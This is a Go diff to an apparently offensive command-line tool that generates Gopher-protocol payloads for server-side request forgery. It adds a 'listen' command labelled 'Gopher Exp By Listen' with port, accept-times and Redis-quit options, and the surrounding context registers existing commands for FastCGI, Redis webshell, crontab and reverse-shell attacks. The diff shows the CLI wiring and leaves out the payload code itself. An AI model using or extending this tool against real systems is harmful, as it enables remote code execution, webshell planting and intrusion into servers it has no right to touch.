@@ -202,6 +202,28 @@ var httpUploadCmd = &cobra.Command{
 	},
 }
 
+// listenCmd
+var listenCmd = &cobra.Command{
+	Use:   "listen [addr]",
+	Short: "Gopher Exp By Listen",
+	Args:  cobra.MinimumNArgs(1),
+	RunE: func(cmd *cobra.Command, args []string) error {
+		addr := args[0]
+		_, _, err := utils.ParseAddr(addr)
+		if err != nil {
+			return err
+		}
+		r, err := gopher.ExpGopher(addr, port, times, quit)
+		if err != nil {
+			return err
+		}
+		for i := 0; i < urlencode; i++ {
+			r = url.QueryEscape(r)
+		}
+		return common.Output(r)
+	},
+}
+
 var (
 	command   string
 	filename  string
@@ -212,6 +234,9 @@ var (
 	reverseAddr string
 
 	datas map[string]string
+
+	port, times int
+	quit        bool
 )
 
 func init() {
@@ -230,6 +255,10 @@ func init() {
 	httpPostCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data")
 	httpUploadCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data/upload file")
 
+	listenCmd.Flags().IntVarP(&port, "port", "p", 9527, "Listen Port")
+	listenCmd.Flags().IntVarP(&times, "times", "t", 1, "Accept Times")
+	listenCmd.Flags().BoolVarP(&quit, "quit", "q", false, "Redis Quit")
+
 	redisCmd.AddCommand(redisWriteCmd, redisWebshellCmd, redisCrontabCmd, redisReverseCmd)
-	rootCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd)
+	rootCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd, listenCmd)
 }
